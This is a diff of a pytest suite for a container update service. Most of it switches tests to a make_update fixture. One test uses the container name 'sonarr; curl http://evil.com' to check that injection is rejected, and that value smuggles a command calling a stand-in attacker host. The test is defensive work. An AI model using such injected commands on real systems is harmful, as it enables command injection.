@@ -529,7 +529,7 @@ class TestHealthCheckValidation:
             assert "exited" in result["error"]
 
     @pytest.mark.asyncio
-    async def test_health_check_validates_container_name(self):
+    async def test_health_check_validates_container_name(self, make_update):
         """Test health check validates container name to prevent injection."""
         container = Container(
             name="sonarr; curl http://evil.com",  # Malicious name
@@ -583,7 +583,7 @@ class TestApplyUpdateOrchestration:
     @pytest.fixture
     def mock_update(self):
         """Create mock update."""
-        return Update(
+        return make_update(
             id=1,
             container_id=1,
             from_tag="3.0.0",
@@ -595,9 +595,9 @@ class TestApplyUpdateOrchestration:
         )
 
     @pytest.mark.asyncio
-    async def test_apply_update_rejects_non_approved_update(self, mock_db):
+    async def test_apply_update_rejects_non_approved_update(self, mock_db, make_update):
         """Test apply_update rejects updates that are not approved."""
-        update = Update(
+        update = make_update(
             id=1,
             container_id=1,
             from_tag="3.0.0",
@@ -1018,11 +1018,11 @@ class TestEventBusProgress:
     """Test suite for event bus progress notifications."""
 
     @pytest.mark.asyncio
-    async def test_apply_update_publishes_starting_event(self):
+    async def test_apply_update_publishes_starting_event(self, make_update):
         """Test apply_update publishes 'starting' progress event."""
         mock_db = AsyncMock()
 
-        update = Update(
+        update = make_update(
             id=1,
             container_id=1,
             from_tag="3.0.0",
@@ -1069,11 +1069,11 @@ class TestEventBusProgress:
             assert starting_events[0]["type"] == "update-progress"
 
     @pytest.mark.asyncio
-    async def test_apply_update_publishes_complete_event_on_success(self):
+    async def test_apply_update_publishes_complete_event_on_success(self, make_update):
         """Test apply_update publishes 'update-complete' event on success."""
         mock_db = AsyncMock()
 
-        update = Update(
+        update = make_update(
             id=1,
             container_id=1,
             from_tag="3.0.0",
